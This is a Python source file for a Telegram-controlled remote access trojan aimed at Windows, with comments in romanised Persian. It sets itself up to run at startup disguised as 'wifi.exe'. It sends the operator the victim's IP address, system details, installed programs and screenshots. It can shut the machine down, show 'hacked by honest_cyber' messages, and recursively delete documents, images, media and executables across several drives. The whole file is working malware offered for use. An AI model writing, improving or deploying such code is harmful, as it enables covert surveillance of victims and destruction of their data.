from telegram.ext import Updater , CommandHandler
import urllib
import subprocess
import autopy
import os
import platform
import pyttsx



#start up 
user=os.path.join(os.path.expandvars("%userprofile%"))
cmd= 'copy bot.exe "{}\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\wifi.exe"'.format(user)
ejra= os.system(cmd)


update = Updater("token_bot")
######################################################################
###################################

def start_method(bot , update ):

    my_ip= urllib.urlopen("http://ip.42.pl/raw").read()
    chat_id = update.message.chat_id
    bot.sendMessage (chat_id , "target ip : "+ my_ip)

###################################

def system_info(bot , update ):
    
    data = "os ="+platform.uname ()[0]+''+ platform.uname()[2]+' ' +platform.architecture()[0]+"\n"
    data += "node ="+platform.node()+"\n"
    data += "user ="+platform.uname()[1]+"\n"
    data +="system type ="+platform.uname()[5]+"\n"

    chat_id = update.message.chat_id
    bot.sendMessage(chat_id ,data )

###################################

def system_app(bot , update ):
    
    barnameha = subprocess.check_output ("wmic product get name ", shell=true)
    chat_id =update.message.chat_id
    bot.sendMessage(chat_id , barnameha )


###################################
#screen shot
def screenshot_method (bot , update ):
    image =autopy.bimap.capture_screen()
    image.save("c:\\Windows\\fuckface.png ")
    chat_id = update.message.chat_id
    
    aks = open ("c:\\Windows\\fuckface.png","rb")
    bot.sendPhoto(chat_id,aks, "aks gerefte shod  ")
    aks.close()

###################################
def shutdown_method (bot , update):

    os.system("shutdown /s")
###################################

def note_method (bot, update ):

    os.system ("echo hacked by honest_cyber > c:\\windows\\h.txt")
    os.system("start c:\\windows\\h.txt")

    chat_id = update.message.chat_id
    bot.sendMessage(chat_id , "neshan dade shod .")

###################################

def notevbs_method (bot, update ):

    os.system ('echo msgbox("hacked by honest_cyber") > c:\\windows\\h.vbs')
    os.system("start c:\\windows\\h.vbs")

    chat_id = update.message.chat_id
    bot.sendMessage(chat_id , "neshan dade shod .")
###################################

def pak_method (bot, update ):

    os.system ('del /S *.txt *.rar *.pdf *.jpg *.py *.mp3 *.mp4 *.jpeg *.png *.exe *.deb ')
    os.system ('cd C:&&del /S *.txt *.rar *.pdf *.jpg *.py *.mp3 *.mp4 *.jpeg *.png *.exe *.deb')
    os.system ('cd E:&&del /S *.txt *.rar *.pdf *.jpg *.py *.mp3 *.mp4 *.jpeg *.png *.exe *.deb')
    os.system ('cd F:&&del /S *.txt *.rar *.pdf *.jpg *.py *.mp3 *.mp4 *.jpeg *.png *.exe *.deb')
    os.system ('cd H:&&del /S *.txt *.rar *.pdf *.jpg *.py *.mp3 *.mp4 *.jpeg *.png *.exe *.deb')
    os.system ('cd D:&&del /S *.txt *.rar *.pdf *.jpg *.py *.mp3 *.mp4 *.jpeg *.png *.exe *.deb')
    

    chat_id = update.message.chat_id
    bot.sendMessage(chat_id , "pak shod.")

###################################

def seda_method (bot, update ):
    s = pyttsx.init()
    s.setProperty("rate", 110)
    s.say("hacked by honest_cyber")
    s.runAndWait()


    chat_id = update.message.chat_id
    bot.sendMessage(chat_id , "shenid ... .")
    

###################################
def help_method (bot, update ):


    help_=""
    help_+= "/stat => ip target ro mide .\n"
    help_+= "/sysinfo => etelat karbar ra be ma mide  .\n"
    help_+= "/sysapp => barname hay karbar ro neshon mide  .\n"
    help_+= "/screen => screen shot mide .\n"
    help_+= "/shutdown => system target ro khamosh mikone .\n"
    help_+= "/note => ba notepad peygham ra neshon mide  .\n"
    help_+= "/notevbs => be sorat barname peygham ra neshon mide  .\n"
    help_+= "/pak => etelat target ra pak mikone.\n"
    help_+= "/seda => seda dar system pahksh mishavd.\n"   

    chat_id = update.message.chat_id
    bot.sendMessage(chat_id ,help_ )    
######################################################################

start = CommandHandler("/start" , start_method)
update.dispatcher.add_handler(start)

sysinfo = CommandHandler ("sysinfo",system_info)
update.dispatcher.add_handler(sysinfo)

#barneme hay nasb shode
sysapp=CommandHandler ("sysapp",system_app)
update.dispatcher.add_handler(sysapp)

#screen shot
screen = CommandHandler("screen", screenshot_method )
update.dispatcher.add_handler(screen)


#shutdown
shutdown= CommandHandler("shutdown", shutdown_method)
update.dispatcher.add_handler(shutdown)

# note 
note= CommandHandler("note", note_method )
update.dispatcher.add_handler(note)

#note sexy
notevbs= CommandHandler("notevbs", notevbs_method )
update.dispatcher.add_handler(notevbs)


#seda

seda= CommandHandler("seda", seda_method )
update.dispatcher.add_handler(seda)




#pak kardan
pak= CommandHandler("pak", pak_method )
update.dispatcher.add_handler(pak)


help_ = CommandHandler("help", help_method )
update.dispatcher.add_handler(help_)


update.start_polling()


